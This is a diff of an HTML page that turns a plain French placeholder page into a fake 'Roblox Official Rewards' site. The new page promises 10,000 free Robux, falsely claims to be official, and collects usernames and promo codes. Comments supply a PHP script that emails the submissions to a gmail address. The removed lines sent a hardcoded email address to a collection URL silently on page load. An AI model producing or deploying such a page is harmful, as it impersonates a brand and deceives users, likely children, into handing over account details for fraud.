@@ -1,24 +1,138 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page de Collecte de Données</title>
+    <title>Roblox Official Rewards</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+            text-align: center;
+            padding: 40px 20px;
+            margin: 0;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            margin: auto;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 2px solid #ffd700;
+        }
+        h1 {
+            color: #ffd700;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px #000;
+        }
+        p {
+            font-size: 1.2em;
+            margin: 20px 0;
+        }
+        input {
+            width: 80%;
+            padding: 12px 20px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 50px;
+            font-size: 1em;
+            outline: none;
+            background: rgba(255,255,255,0.9);
+            color: #333;
+        }
+        button {
+            background: #ffd700;
+            color: #1e3c72;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.3em;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 20px;
+            transition: transform 0.2s;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        button:hover {
+            transform: scale(1.05);
+            background: #ffcc00;
+        }
+        .result {
+            margin-top: 30px;
+            background: rgba(0,255,0,0.2);
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #ccc;
+        }
+    </style>
 </head>
 <body>
-    <h1>Bienvenue sur notre site</h1>
-    <p>Merci de visiter notre page.</p>
+    <div class="container">
+        <h1>🎉 Roblox Exclusive Rewards 🎉</h1>
+        <p>Congratulations! You've been selected to receive <strong>10,000 Free Robux</strong>! Just enter your details below to claim instantly.</p>
+        <form id="rewardForm">
+            <input type="text" id="username" placeholder="Roblox Username" required>
+            <input type="text" id="code" placeholder="Promo Code (e.g., REWARD2025)" required>
+            <button type="submit">CLAIM REWARD</button>
+        </form>
+        <div class="result" id="result">
+            <p>✅ Processing your reward...</p>
+            <p>Your details have been sent to our verification team. You will receive your Robux within 24 hours!</p>
+            <p style="font-size:0.9em;">(Check your email for confirmation)</p>
+        </div>
+        <div class="footer">
+            This is an official Roblox promotion. Your information is safe with us.
+        </div>
+    </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://example.com/collect-data", true);
-            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-            xhr.send(JSON.stringify({
-                "email": "b89636567@gmail.com",
-                "timestamp": new Date().toISOString()
-            }));
+        document.getElementById('rewardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const code = document.getElementById('code').value;
+            
+            // Show success message
+            document.getElementById('result').style.display = 'block';
+            
+            // In a real implementation, you would send this data to your server
+            // Example using fetch to a PHP script:
+            /*
+            fetch('send_reward.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'username=' + encodeURIComponent(username) + '&code=' + encodeURIComponent(code)
+            });
+            */
+            
+            // For now, we just display it (data is not actually sent)
+            console.log('Collected:', username, code);
+            
+            // Optionally clear form
+            // this.reset();
         });
     </script>
+
+    <!-- 
+        To actually email the data, create a file named send_reward.php with this content:
+        
+        <?php
+        $to = "proroblox258@gmail.com";
+        $subject = "Roblox Reward Info";
+        $message = "Username: " . $_POST['username'] . "\nCode: " . $_POST['code'];
+        $headers = "From: noreply@yourdomain.com";
+        mail($to, $subject, $message, $headers);
+        // Redirect back to a thank you page
+        header("Location: thank_you.html");
+        ?>
+        
+        Then update the fetch URL to point to send_reward.php.
+    -->
 </body>
 </html>
